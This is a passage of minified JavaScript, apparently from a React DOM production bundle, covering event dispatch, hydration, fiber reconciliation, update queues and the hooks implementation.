e;if((k||g)&&(g=m.window===m?m:(g=m.ownerDocument)?g.defaultView||g.parentWindow:window,k?(w=t.relatedTarget||t.toElement,k=d,w=w?Nn(w):null,w!==null&&(C=Un(w),w!==C||w.tag!==5&&w.tag!==6)&&(w=null)):(k=null,w=d),k!==w)){if(x=ws,v="onMouseLeave",p="onMouseEnter",c="mouse",(e==="pointerout"||e==="pointerover")&&(x=xs,v="onPointerLeave",p="onPointerEnter",c="pointer"),C=k==null?g:Kn(k),f=w==null?g:Kn(w),g=new x(v,c+"leave",k,t,m),g.target=C,g.relatedTarget=f,v=null,Nn(m)===d&&(x=new x(p,c+"enter",w,t,m),x.target=f,x.relatedTarget=C,v=x),C=v,k&&w)n:{for(x=k,p=w,c=0,f=x;f;f=Hn(f))c++;for(f=0,v=p;v;v=Hn(v))f++;for(;0<c-f;)x=Hn(x),c--;for(;0<f-c;)p=Hn(p),f--;for(;c--;){if(x===p||p!==null&&x===p.alternate)break n;x=Hn(x),p=Hn(p)}x=null}else x=null;k!==null&&Os(h,g,k,x,!1),w!==null&&C!==null&&Os(h,C,w,x,!0)}}e:{if(g=d?Kn(d):window,k=g.nodeName&&g.nodeName.toLowerCase(),k==="select"||k==="input"&&g.type==="file")var y=Lf;else if(Es(g))if(ku)y=Af;else{y=Of;var T=jf}else(k=g.nodeName)&&k.toLowerCase()==="input"&&(g.type==="checkbox"||g.type==="radio")&&(y=Rf);if(y&&(y=y(e,d))){wu(h,y,t,m);break e}T&&T(e,g,d),e==="focusout"&&(T=g._wrapperState)&&T.controlled&&g.type==="number"&&ml(g,"number",g.value)}switch(T=d?Kn(d):window,e){case"focusin":(Es(T)||T.contentEditable==="true")&&(Gn=T,_l=d,Mt=null);break;case"focusout":Mt=_l=Gn=null;break;case"mousedown":Pl=!0;break;case"contextmenu":case"mouseup":case"dragend":Pl=!1,Ns(h,t,m);break;case"selectionchange":if(Df)break;case"keydown":case"keyup":Ns(h,t,m)}var E;if(So)e:{switch(e){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else $n?vu(e,t)&&(N="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(gu&&t.locale!=="ko"&&($n||N!=="onCompositionStart"?N==="onCompositionEnd"&&$n&&(E=mu()):(ln=m,wo="value"in ln?ln.value:ln.textContent,$n=!0)),T=qr(d,N),0<T.length&&(N=new ks(N,e,null,t,m),h.push({event:N,listeners:T}),E?N.data=E:(E=yu(t),E!==null&&(N.data=E)))),(E=Cf?Tf(e,t):_f(e,t))&&(d=qr(d,"onBeforeInput"),0<d.length&&(m=new ks("onBeforeInput","beforeinput",null,t,m),h.push({event:m,listeners:d}),m.data=E))}Lu(h,n)})}function Yt(e,n,t){return{instance:e,listener:n,currentTarget:t}}function qr(e,n){for(var t=n+"Capture",r=[];e!==null;){var i=e,l=i.stateNode;i.tag===5&&l!==null&&(i=l,l=Ht(e,t),l!=null&&r.unshift(Yt(e,l,i)),l=Ht(e,n),l!=null&&r.push(Yt(e,l,i))),e=e.return}return r}function Hn(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Os(e,n,t,r,i){for(var l=n._reactName,o=[];t!==null&&t!==r;){var s=t,a=s.alternate,d=s.stateNode;if(a!==null&&a===r)break;s.tag===5&&d!==null&&(s=d,i?(a=Ht(t,l),a!=null&&o.unshift(Yt(t,a,s))):i||(a=Ht(t,l),a!=null&&o.push(Yt(t,a,s)))),t=t.return}o.length!==0&&e.push({event:n,listeners:o})}var Ff=/\r\n?/g,Hf=/\u0000|\uFFFD/g;function Rs(e){return(typeof e=="string"?e:""+e).replace(Ff,`
`).replace(Hf,"")}function Cr(e,n,t){if(n=Rs(n),Rs(e)!==n&&t)throw Error(S(425))}function Jr(){}var Nl=null,Ll=null;function jl(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Ol=typeof setTimeout=="function"?setTimeout:void 0,Vf=typeof clearTimeout=="function"?clearTimeout:void 0,As=typeof Promise=="function"?Promise:void 0,Wf=typeof queueMicrotask=="function"?queueMicrotask:typeof As<"u"?function(e){return As.resolve(null).then(e).catch($f)}:Ol;function $f(e){setTimeout(function(){throw e})}function qi(e,n){var t=n,r=0;do{var i=t.nextSibling;if(e.removeChild(t),i&&i.nodeType===8)if(t=i.data,t==="/$"){if(r===0){e.removeChild(i),$t(n);return}r--}else t!=="$"&&t!=="$?"&&t!=="$!"||r++;t=i}while(t);$t(n)}function dn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function Ms(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var gt=Math.random().toString(36).slice(2),ze="__reactFiber$"+gt,Xt="__reactProps$"+gt,Ye="__reactContainer$"+gt,Rl="__reactEvents$"+gt,Gf="__reactListeners$"+gt,Qf="__reactHandles$"+gt;function Nn(e){var n=e[ze];if(n)return n;for(var t=e.parentNode;t;){if(n=t[Ye]||t[ze]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=Ms(e);e!==null;){if(t=e[ze])return t;e=Ms(e)}return n}e=t,t=e.parentNode}return null}function ur(e){return e=e[ze]||e[Ye],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Kn(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(S(33))}function ki(e){return e[Xt]||null}var Al=[],Yn=-1;function kn(e){return{current:e}}function z(e){0>Yn||(e.current=Al[Yn],Al[Yn]=null,Yn--)}function I(e,n){Yn++,Al[Yn]=e.current,e.current=n}var yn={},oe=kn(yn),pe=kn(!1),An=yn;function at(e,n){var t=e.type.contextTypes;if(!t)return yn;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===n)return r.__reactInternalMemoizedMaskedChildContext;var i={},l;for(l in t)i[l]=n[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=i),i}function he(e){return e=e.childContextTypes,e!=null}function Zr(){z(pe),z(oe)}function Is(e,n,t){if(oe.current!==yn)throw Error(S(168));I(oe,n),I(pe,t)}function Ou(e,n,t){var r=e.stateNode;if(n=n.childContextTypes,typeof r.getChildContext!="function")return t;r=r.getChildContext();for(var i in r)if(!(i in n))throw Error(S(108,Ld(e)||"Unknown",i));return V({},t,r)}function ei(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||yn,An=oe.current,I(oe,e),I(pe,pe.current),!0}function Ds(e,n,t){var r=e.stateNode;if(!r)throw Error(S(169));t?(e=Ou(e,n,An),r.__reactInternalMemoizedMergedChildContext=e,z(pe),z(oe),I(oe,e)):z(pe),I(pe,t)}var Ve=null,xi=!1,Ji=!1;function Ru(e){Ve===null?Ve=[e]:Ve.push(e)}function Kf(e){xi=!0,Ru(e)}function xn(){if(!Ji&&Ve!==null){Ji=!0;var e=0,n=M;try{var t=Ve;for(M=1;e<t.length;e++){var r=t[e];do r=r(!0);while(r!==null)}Ve=null,xi=!1}catch(i){throw Ve!==null&&(Ve=Ve.slice(e+1)),iu(mo,xn),i}finally{M=n,Ji=!1}}return null}var Xn=[],qn=0,ni=null,ti=0,be=[],Ee=0,Mn=null,We=1,$e="";function Tn(e,n){Xn[qn++]=ti,Xn[qn++]=ni,ni=e,ti=n}function Au(e,n,t){be[Ee++]=We,be[Ee++]=$e,be[Ee++]=Mn,Mn=e;var r=We;e=$e;var i=32-Re(r)-1;r&=~(1<<i),t+=1;var l=32-Re(n)+i;if(30<l){var o=i-i%5;l=(r&(1<<o)-1).toString(32),r>>=o,i-=o,We=1<<32-Re(n)+i|t<<i|r,$e=l+e}else We=1<<l|t<<i|r,$e=e}function Eo(e){e.return!==null&&(Tn(e,1),Au(e,1,0))}function Co(e){for(;e===ni;)ni=Xn[--qn],Xn[qn]=null,ti=Xn[--qn],Xn[qn]=null;for(;e===Mn;)Mn=be[--Ee],be[Ee]=null,$e=be[--Ee],be[Ee]=null,We=be[--Ee],be[Ee]=null}var we=null,ye=null,B=!1,Oe=null;function Mu(e,n){var t=Ce(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function zs(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,we=e,ye=dn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,we=e,ye=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=Mn!==null?{id:We,overflow:$e}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Ce(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,we=e,ye=null,!0):!1;default:return!1}}function Ml(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Il(e){if(B){var n=ye;if(n){var t=n;if(!zs(e,n)){if(Ml(e))throw Error(S(418));n=dn(t.nextSibling);var r=we;n&&zs(e,n)?Mu(r,t):(e.flags=e.flags&-4097|2,B=!1,we=e)}}else{if(Ml(e))throw Error(S(418));e.flags=e.flags&-4097|2,B=!1,we=e}}}function Bs(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;we=e}function Tr(e){if(e!==we)return!1;if(!B)return Bs(e),B=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!jl(e.type,e.memoizedProps)),n&&(n=ye)){if(Ml(e))throw Iu(),Error(S(418));for(;n;)Mu(e,n),n=dn(n.nextSibling)}if(Bs(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(S(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){ye=dn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}ye=null}}else ye=we?dn(e.stateNode.nextSibling):null;return!0}function Iu(){for(var e=ye;e;)e=dn(e.nextSibling)}function ut(){ye=we=null,B=!1}function To(e){Oe===null?Oe=[e]:Oe.push(e)}var Yf=Je.ReactCurrentBatchConfig;function Et(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(S(309));var r=t.stateNode}if(!r)throw Error(S(147,e));var i=r,l=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===l?n.ref:(n=function(o){var s=i.refs;o===null?delete s[l]:s[l]=o},n._stringRef=l,n)}if(typeof e!="string")throw Error(S(284));if(!t._owner)throw Error(S(290,e))}return e}function _r(e,n){throw e=Object.prototype.toString.call(n),Error(S(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Us(e){var n=e._init;return n(e._payload)}function Du(e){function n(p,c){if(e){var f=p.deletions;f===null?(p.deletions=[c],p.flags|=16):f.push(c)}}function t(p,c){if(!e)return null;for(;c!==null;)n(p,c),c=c.sibling;return null}function r(p,c){for(p=new Map;c!==null;)c.key!==null?p.set(c.key,c):p.set(c.index,c),c=c.sibling;return p}function i(p,c){return p=mn(p,c),p.index=0,p.sibling=null,p}function l(p,c,f){return p.index=f,e?(f=p.alternate,f!==null?(f=f.index,f<c?(p.flags|=2,c):f):(p.flags|=2,c)):(p.flags|=1048576,c)}function o(p){return e&&p.alternate===null&&(p.flags|=2),p}function s(p,c,f,v){return c===null||c.tag!==6?(c=ll(f,p.mode,v),c.return=p,c):(c=i(c,f),c.return=p,c)}function a(p,c,f,v){var y=f.type;return y===Wn?m(p,c,f.props.children,v,f.key):c!==null&&(c.elementType===y||typeof y=="object"&&y!==null&&y.$$typeof===en&&Us(y)===c.type)?(v=i(c,f.props),v.ref=Et(p,c,f),v.return=p,v):(v=Vr(f.type,f.key,f.props,null,p.mode,v),v.ref=Et(p,c,f),v.return=p,v)}function d(p,c,f,v){return c===null||c.tag!==4||c.stateNode.containerInfo!==f.containerInfo||c.stateNode.implementation!==f.implementation?(c=ol(f,p.mode,v),c.return=p,c):(c=i(c,f.children||[]),c.return=p,c)}function m(p,c,f,v,y){return c===null||c.tag!==7?(c=Rn(f,p.mode,v,y),c.return=p,c):(c=i(c,f),c.return=p,c)}function h(p,c,f){if(typeof c=="string"&&c!==""||typeof c=="number")return c=ll(""+c,p.mode,f),c.return=p,c;if(typeof c=="object"&&c!==null){switch(c.$$typeof){case gr:return f=Vr(c.type,c.key,c.props,null,p.mode,f),f.ref=Et(p,null,c),f.return=p,f;case Vn:return c=ol(c,p.mode,f),c.return=p,c;case en:var v=c._init;return h(p,v(c._payload),f)}if(Pt(c)||wt(c))return c=Rn(c,p.mode,f,null),c.return=p,c;_r(p,c)}return null}function g(p,c,f,v){var y=c!==null?c.key:null;if(typeof f=="string"&&f!==""||typeof f=="number")return y!==null?null:s(p,c,""+f,v);if(typeof f=="object"&&f!==null){switch(f.$$typeof){case gr:return f.key===y?a(p,c,f,v):null;case Vn:return f.key===y?d(p,c,f,v):null;case en:return y=f._init,g(p,c,y(f._payload),v)}if(Pt(f)||wt(f))return y!==null?null:m(p,c,f,v,null);_r(p,f)}return null}function k(p,c,f,v,y){if(typeof v=="string"&&v!==""||typeof v=="number")return p=p.get(f)||null,s(c,p,""+v,y);if(typeof v=="object"&&v!==null){switch(v.$$typeof){case gr:return p=p.get(v.key===null?f:v.key)||null,a(c,p,v,y);case Vn:return p=p.get(v.key===null?f:v.key)||null,d(c,p,v,y);case en:var T=v._init;return k(p,c,f,T(v._payload),y)}if(Pt(v)||wt(v))return p=p.get(f)||null,m(c,p,v,y,null);_r(c,v)}return null}function w(p,c,f,v){for(var y=null,T=null,E=c,N=c=0,U=null;E!==null&&N<f.length;N++){E.index>N?(U=E,E=null):U=E.sibling;var j=g(p,E,f[N],v);if(j===null){E===null&&(E=U);break}e&&E&&j.alternate===null&&n(p,E),c=l(j,c,N),T===null?y=j:T.sibling=j,T=j,E=U}if(N===f.length)return t(p,E),B&&Tn(p,N),y;if(E===null){for(;N<f.length;N++)E=h(p,f[N],v),E!==null&&(c=l(E,c,N),T===null?y=E:T.sibling=E,T=E);return B&&Tn(p,N),y}for(E=r(p,E);N<f.length;N++)U=k(E,p,N,f[N],v),U!==null&&(e&&U.alternate!==null&&E.delete(U.key===null?N:U.key),c=l(U,c,N),T===null?y=U:T.sibling=U,T=U);return e&&E.forEach(function(ge){return n(p,ge)}),B&&Tn(p,N),y}function x(p,c,f,v){var y=wt(f);if(typeof y!="function")throw Error(S(150));if(f=y.call(f),f==null)throw Error(S(151));for(var T=y=null,E=c,N=c=0,U=null,j=f.next();E!==null&&!j.done;N++,j=f.next()){E.index>N?(U=E,E=null):U=E.sibling;var ge=g(p,E,j.value,v);if(ge===null){E===null&&(E=U);break}e&&E&&ge.alternate===null&&n(p,E),c=l(ge,c,N),T===null?y=ge:T.sibling=ge,T=ge,E=U}if(j.done)return t(p,E),B&&Tn(p,N),y;if(E===null){for(;!j.done;N++,j=f.next())j=h(p,j.value,v),j!==null&&(c=l(j,c,N),T===null?y=j:T.sibling=j,T=j);return B&&Tn(p,N),y}for(E=r(p,E);!j.done;N++,j=f.next())j=k(E,p,N,j.value,v),j!==null&&(e&&j.alternate!==null&&E.delete(j.key===null?N:j.key),c=l(j,c,N),T===null?y=j:T.sibling=j,T=j);return e&&E.forEach(function(bn){return n(p,bn)}),B&&Tn(p,N),y}function C(p,c,f,v){if(typeof f=="object"&&f!==null&&f.type===Wn&&f.key===null&&(f=f.props.children),typeof f=="object"&&f!==null){switch(f.$$typeof){case gr:e:{for(var y=f.key,T=c;T!==null;){if(T.key===y){if(y=f.type,y===Wn){if(T.tag===7){t(p,T.sibling),c=i(T,f.props.children),c.return=p,p=c;break e}}else if(T.elementType===y||typeof y=="object"&&y!==null&&y.$$typeof===en&&Us(y)===T.type){t(p,T.sibling),c=i(T,f.props),c.ref=Et(p,T,f),c.return=p,p=c;break e}t(p,T);break}else n(p,T);T=T.sibling}f.type===Wn?(c=Rn(f.props.children,p.mode,v,f.key),c.return=p,p=c):(v=Vr(f.type,f.key,f.props,null,p.mode,v),v.ref=Et(p,c,f),v.return=p,p=v)}return o(p);case Vn:e:{for(T=f.key;c!==null;){if(c.key===T)if(c.tag===4&&c.stateNode.containerInfo===f.containerInfo&&c.stateNode.implementation===f.implementation){t(p,c.sibling),c=i(c,f.children||[]),c.return=p,p=c;break e}else{t(p,c);break}else n(p,c);c=c.sibling}c=ol(f,p.mode,v),c.return=p,p=c}return o(p);case en:return T=f._init,C(p,c,T(f._payload),v)}if(Pt(f))return w(p,c,f,v);if(wt(f))return x(p,c,f,v);_r(p,f)}return typeof f=="string"&&f!==""||typeof f=="number"?(f=""+f,c!==null&&c.tag===6?(t(p,c.sibling),c=i(c,f),c.return=p,p=c):(t(p,c),c=ll(f,p.mode,v),c.return=p,p=c),o(p)):t(p,c)}return C}var ct=Du(!0),zu=Du(!1),ri=kn(null),ii=null,Jn=null,_o=null;function Po(){_o=Jn=ii=null}function No(e){var n=ri.current;z(ri),e._currentValue=n}function Dl(e,n,t){for(;e!==null;){var r=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,r!==null&&(r.childLanes|=n)):r!==null&&(r.childLanes&n)!==n&&(r.childLanes|=n),e===t)break;e=e.return}}function lt(e,n){ii=e,_o=Jn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(fe=!0),e.firstContext=null)}function _e(e){var n=e._currentValue;if(_o!==e)if(e={context:e,memoizedValue:n,next:null},Jn===null){if(ii===null)throw Error(S(308));Jn=e,ii.dependencies={lanes:0,firstContext:e}}else Jn=Jn.next=e;return n}var Ln=null;function Lo(e){Ln===null?Ln=[e]:Ln.push(e)}function Bu(e,n,t,r){var i=n.interleaved;return i===null?(t.next=t,Lo(n)):(t.next=i.next,i.next=t),n.interleaved=t,Xe(e,r)}function Xe(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var nn=!1;function jo(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Uu(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ge(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function fn(e,n,t){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,A&2){var i=r.pending;return i===null?n.next=n:(n.next=i.next,i.next=n),r.pending=n,Xe(e,t)}return i=r.interleaved,i===null?(n.next=n,Lo(r)):(n.next=i.next,i.next=n),r.interleaved=n,Xe(e,t)}function Dr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var r=n.lanes;r&=e.pendingLanes,t|=r,n.lanes=t,go(e,t)}}function Fs(e,n){var t=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,t===r)){var i=null,l=null;if(t=t.firstBaseUpdate,t!==null){do{var o={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};l===null?i=l=o:l=l.next=o,t=t.next}while(t!==null);l===null?i=l=n:l=l.next=n}else i=l=n;t={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function li(e,n,t,r){var i=e.updateQueue;nn=!1;var l=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(s!==null){i.shared.pending=null;var a=s,d=a.next;a.next=null,o===null?l=d:o.next=d,o=a;var m=e.alternate;m!==null&&(m=m.updateQueue,s=m.lastBaseUpdate,s!==o&&(s===null?m.firstBaseUpdate=d:s.next=d,m.lastBaseUpdate=a))}if(l!==null){var h=i.baseState;o=0,m=d=a=null,s=l;do{var g=s.lane,k=s.eventTime;if((r&g)===g){m!==null&&(m=m.next={eventTime:k,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var w=e,x=s;switch(g=n,k=t,x.tag){case 1:if(w=x.payload,typeof w=="function"){h=w.call(k,h,g);break e}h=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=x.payload,g=typeof w=="function"?w.call(k,h,g):w,g==null)break e;h=V({},h,g);break e;case 2:nn=!0}}s.callback!==null&&s.lane!==0&&(e.flags|=64,g=i.effects,g===null?i.effects=[s]:g.push(s))}else k={eventTime:k,lane:g,tag:s.tag,payload:s.payload,callback:s.callback,next:null},m===null?(d=m=k,a=h):m=m.next=k,o|=g;if(s=s.next,s===null){if(s=i.shared.pending,s===null)break;g=s,s=g.next,g.next=null,i.lastBaseUpdate=g,i.shared.pending=null}}while(!0);if(m===null&&(a=h),i.baseState=a,i.firstBaseUpdate=d,i.lastBaseUpdate=m,n=i.shared.interleaved,n!==null){i=n;do o|=i.lane,i=i.next;while(i!==n)}else l===null&&(i.shared.lanes=0);Dn|=o,e.lanes=o,e.memoizedState=h}}function Hs(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var r=e[n],i=r.callback;if(i!==null){if(r.callback=null,r=t,typeof i!="function")throw Error(S(191,i));i.call(r)}}}var cr={},Ue=kn(cr),qt=kn(cr),Jt=kn(cr);function jn(e){if(e===cr)throw Error(S(174));return e}function Oo(e,n){switch(I(Jt,n),I(qt,e),I(Ue,cr),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:vl(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=vl(n,e)}z(Ue),I(Ue,n)}function dt(){z(Ue),z(qt),z(Jt)}function Fu(e){jn(Jt.current);var n=jn(Ue.current),t=vl(n,e.type);n!==t&&(I(qt,e),I(Ue,t))}function Ro(e){qt.current===e&&(z(Ue),z(qt))}var F=kn(0);function oi(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Zi=[];function Ao(){for(var e=0;e<Zi.length;e++)Zi[e]._workInProgressVersionPrimary=null;Zi.length=0}var zr=Je.ReactCurrentDispatcher,el=Je.ReactCurrentBatchConfig,In=0,H=null,Y=null,J=null,si=!1,It=!1,Zt=0,Xf=0;function re(){throw Error(S(321))}function Mo(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Me(e[t],n[t]))return!1;return!0}function Io(e,n,t,r,i,l){if(In=l,H=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,zr.current=e===null||e.memoizedState===null?ep:np,e=t(r,i),It){l=0;do{if(It=!1,Zt=0,25<=l)throw Error(S(301));l+=1,J=Y=null,n.updateQueue=null,zr.current=tp,e=t(r,i)}while(It)}if(zr.current=ai,n=Y!==null&&Y.next!==null,In=0,J=Y=H=null,si=!1,n)throw Error(S(300));return e}function Do(){var e=Zt!==0;return Zt=0,e}function De(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return J===null?H.memoizedState=J=e:J=J.next=e,J}function Pe(){if(Y===null){var e=H.alternate;e=e!==null?e.memoizedState:null}else e=Y.next;var n=J===null?H.memoizedState:J.next;if(n!==null)J=n,Y=e;else{if(e===null)throw Error(S(310));Y=e,e={memoizedState:Y.memoizedState,baseState:Y.baseState,baseQueue:Y.baseQueue,queue:Y.queue,next:null},J===null?H.memoizedState=J=e:J=J.next=e}return J}function er(e,n){return typeof n=="function"?n(e):n}function nl(e){var n=Pe(),t=n.queue;if(t===null)throw Error(S(311));t.lastRenderedReducer=e;var r=Y,i=r.baseQueue,l=t.pending;if(l!==null){if(i!==null){var o=i.next;i.next=l.next,l.next=o}r.baseQueue=i=l,t.pending=null}if(i!==null){l=i.next,r=r.baseState;var s=o=null,a=null,d=l;do{var m=d.lane;if((In&m)===m)a!==null&&(a=a.next={lane:0,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null}),r=d.hasEagerState?d.eagerState:e(r,d.action);else{var h={lane:m,action:d.action,hasEagerState:d.hasEagerState,eagerState:d.eagerState,next:null};a===null?(s=a=h,o=r):a=a.next=h,H.lanes|=m,Dn|=m}d=d.next}while(d!==null&&d!==l);a===null?o=r:a.next=s,Me(r,n.memoizedState)||(fe=!0),n.memoizedState=r,n.baseState=o,n.baseQueue=a,t.lastRenderedState=r}if(e=t.interleaved,e!==null){i=e;do l=i.lane,H.lanes|=l,Dn|=l,i=i.next;while(i!==e)}else i===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function tl(e){var n=Pe(),t=n.queue;if(t===null)throw Error(S(311));t.lastRenderedReducer=e;var r=t.dispatch,i=t.pending,l=n.memoizedState;if(i!==null){t.pending=null;var o=i=i.next;do l=e(l,o.action),o=o.next;while(o!==i);Me(l,n.memoizedState)||(fe=!0),n.memoizedState=l,n.baseQueue===null&&(n.baseState=l),t.lastRenderedState=l}return[l,r]}function Hu(){}function Vu(e,n){var t=H,r=Pe(),i=n(),l=!Me(r.memoizedState,i);if(l&&(r.memoizedState=i,fe=!0),r=r.queue,zo(Gu.bind(null,t,r,e),[e]),r.getSnapshot!==n||l||J!==null&&J.memoizedState.tag&1){if(t.flags|=2048,nr(9,$u.bind(null,t,r,i,n),void 0,null),Z===null)throw Error(S(349));In&30||Wu(t,n,i)}return i}function Wu(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=H.updateQueue,n===null?(n={lastEffect:null,stores:null},H.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function $u(e,n,t,r){n.value=t,n.getSnapshot=r,Qu(n)&&Ku(e)}function Gu(e,n,t){return t(function(){Qu(n)&&Ku(e)})}function Qu(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Me(e,t)}catch{return!0}}function Ku(e){var n=Xe(e,1);n!==null&&Ae(n,e,1,-1)}function Vs(e){var n=De();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:er,lastRenderedState:e},n.queue=e,e=e.dispatch=Zf.bind(null,H,e),[n.memoizedState,e]}function nr(e,n,t,r){return e={tag:e,create:n,destroy:t,deps:r,next:null},n=H.updateQueue,n===null?(n={lastEffect:null,stores:null},H.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(r=t.next,t.next=e,e.next=r,n.lastEffect=e)),e}function Yu(){return Pe().memoizedState}function Br(e,n,t,r){var i=De();H.flags|=e,i.memoizedState=nr(1|n,t,void 0,r===void 0?null:r)}function Si(e,n,t,r){var i=Pe();r=r===void 0?null:r;var l=void 0;if(Y!==null){var o=Y.memoizedState;if(l=o.destroy,r!==null&&Mo(r,o.deps)){i.memoizedState=nr(n,t,l,r);return}}H.flags|=e,i.memoizedState=nr(1|n,t,l,r)}function Ws(e,n){return Br(8390656,8,e,n)}function zo(e,n){return Si(2048,8,e,n)}function Xu(e,n){return Si(4,2,e,n)}function qu(e,n){return Si(4,4,e,n)}function Ju(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Zu(e,n,t){return t=t!=null?t.concat([e]):null,Si(4,4,Ju.bind(null,n,e),t)}function Bo(){}function ec(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&Mo(n,r[1])?r[0]:(t.memoizedState=[e,n],e)}function nc(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&Mo(n,r[1])?r[0]:(e=e(),t.memoizedState=[e,n],e)}function tc(e,n,t){return In&21?(Me(t,n)||(t=su(),H.lanes|=t,Dn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,fe=!0),e.memoizedState=t)}function qf(e,n){var t=M;M=t!==0&&4>t?t:4,e(!0);var r=el.transition;el.transition={};try{e(!1),n()}finally{M=t,el.transition=r}}function rc(){return Pe().memoizedState}function Jf(e,n,t){var r=hn(e);if(t={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null},ic(e))lc(n,t);else if(t=Bu(e,n,t,r),t!==null){var i=ae();Ae(t,e,r,i),oc(t,n,r)}}function Zf(e,n,t){var r=hn(e),i={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null};if(ic(e))lc(n,i);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=n.lastRenderedReducer,l!==null))try{var 